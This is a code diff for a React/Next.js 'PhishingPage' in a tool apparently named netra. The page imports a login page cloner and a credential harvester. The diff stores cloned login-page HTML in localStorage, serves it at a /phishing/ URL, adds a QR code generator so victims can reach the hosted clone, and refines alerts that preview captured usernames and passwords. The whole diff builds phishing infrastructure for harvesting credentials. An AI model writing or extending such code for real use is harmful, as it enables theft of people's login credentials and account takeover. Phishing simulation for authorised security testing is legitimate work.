@@ -5,39 +5,25 @@ import { useState, useEffect } from 'react';
 import { useToast } from '@/hooks/use-toast';
 import { CredentialHarvester, type CapturedCredential } from '@/components/credential-harvester';
 import { LoginPageCloner } from '@/components/login-page-cloner';
-import { useRouter } from 'next/navigation';
-
-// In-memory store for passing HTML to the preview page.
-// In a real multi-user app, this would be managed more robustly (e.g., Redis, DB).
-const pageStore = new Map<string, string>();
-
-export function storeClonedPage(htmlContent: string): string {
-    const id = crypto.randomUUID();
-    pageStore.set(id, htmlContent);
-    // Auto-expire the page data to prevent memory leaks
-    setTimeout(() => pageStore.delete(id), 5 * 60 * 1000); // 5 minutes
-    return id;
-}
-
-export function retrieveClonedPage(id: string): string | undefined {
-    return pageStore.get(id);
-}
-
+import { QrCodeGenerator } from '@/components/qr-code-generator';
 
 export default function PhishingPage() {
   const { toast } = useToast();
-  const router = useRouter();
   const [capturedCredentials, setCapturedCredentials] = useState<CapturedCredential[]>([]);
+  const [hostedPageUrl, setHostedPageUrl] = useState<string | null>(null);
   const storageKey = 'netra-captured-credentials';
+  const [isClient, setIsClient] = useState(false);
+
+  useEffect(() => {
+    setIsClient(true);
+    loadCredentialsFromStorage();
+  }, []);
 
   const loadCredentialsFromStorage = () => {
+    if (typeof window === 'undefined') return;
     try {
         const storedCreds = localStorage.getItem(storageKey);
-        if (storedCreds) {
-            setCapturedCredentials(JSON.parse(storedCreds));
-        } else {
-            setCapturedCredentials([]);
-        }
+        setCapturedCredentials(storedCreds ? JSON.parse(storedCreds) : []);
     } catch (error) {
         console.error('Failed to load credentials from localStorage', error);
         setCapturedCredentials([]);
@@ -45,31 +31,27 @@ export default function PhishingPage() {
   };
 
   useEffect(() => {
-    loadCredentialsFromStorage();
-  }, []);
-
-  useEffect(() => {
     const handleStorageChange = (event: StorageEvent) => {
       if (event.key === storageKey) {
         const newCredsRaw = event.newValue;
+        const currentCreds = capturedCredentials;
+
         if (newCredsRaw) {
           try {
-            const newCreds = JSON.parse(newCredsRaw);
-            const currentLength = capturedCredentials.length;
+            const newCredsList: CapturedCredential[] = JSON.parse(newCredsRaw);
+            setCapturedCredentials(newCredsList); 
 
-            setCapturedCredentials(newCreds); 
-
-            if (newCreds.length > currentLength) {
-                const newCredential = newCreds[newCreds.length - 1];
+            if (newCredsList.length > currentCreds.length) {
+                const newCredential = newCredsList[newCredsList.length - 1];
                 const summary = Object.entries(newCredential)
                     .filter(([key]) => key !== 'timestamp' && key !== 'source')
-                    .map(([key, value]) => `${key}: ${String(value).substring(0,20)}`)
+                    .map(([key, value]) => `${key}: ${String(value).substring(0,20)}...`)
                     .join(', ');
 
                 toast({
                   variant: "destructive",
                   title: "Credentials Captured!",
-                  description: summary || "A form was submitted.",
+                  description: summary || "A form was submitted on a cloned page.",
                 });
             }
           } catch (e) {
@@ -85,24 +67,38 @@ export default function PhishingPage() {
     return () => {
       window.removeEventListener('storage', handleStorageChange);
     };
-  }, [toast, capturedCredentials.length]); 
+  }, [toast, capturedCredentials]);
 
   const handleClearCredentials = () => {
     setCapturedCredentials([]);
     localStorage.removeItem(storageKey);
   };
-
-  const handleRefreshCredentials = () => {
-    loadCredentialsFromStorage();
-    toast({ title: "Log Refreshed" });
-  };
   
   const handleHostPage = (htmlContent: string) => {
-    const pageId = storeClonedPage(htmlContent);
-    // Open in a new tab
-    const url = `/phishing/${pageId}`;
-    window.open(url, '_blank');
-    toast({ title: "Page Hosted", description: "Cloned page opened in a new tab."});
+    try {
+      const pageId = crypto.randomUUID();
+      const storageKey = `phishing-page-${pageId}`;
+      
+      // Store the page content in localStorage
+      localStorage.setItem(storageKey, htmlContent);
+      
+      // Remove the content after a reasonable time to prevent localStorage bloat
+      setTimeout(() => localStorage.removeItem(storageKey), 10 * 60 * 1000); // 10 minutes
+
+      // Open the viewer page in a new tab
+      const url = `/phishing/${pageId}`;
+      window.open(url, '_blank');
+
+      if (isClient) {
+          setHostedPageUrl(window.location.origin + url);
+      }
+
+      toast({ title: "Page Hosted", description: "Cloned page opened in a new tab."});
+
+    } catch (e) {
+        console.error("Failed to host page in localStorage", e);
+        toast({ variant: 'destructive', title: "Hosting Failed", description: "Could not save page content to browser storage." });
+    }
   };
 
   return (
@@ -115,12 +111,13 @@ export default function PhishingPage() {
       <div className="grid lg:grid-cols-2 gap-6 items-start">
         <div className="flex flex-col gap-6">
           <LoginPageCloner onHostPage={handleHostPage} />
+          {hostedPageUrl && <QrCodeGenerator url={hostedPageUrl} />}
         </div>
         <div className="flex flex-col gap-6">
           <CredentialHarvester 
             credentials={capturedCredentials} 
             onClear={handleClearCredentials} 
-            onRefresh={handleRefreshCredentials} 
+            onRefresh={loadCredentialsFromStorage} 
           />
         </div>
       </div>
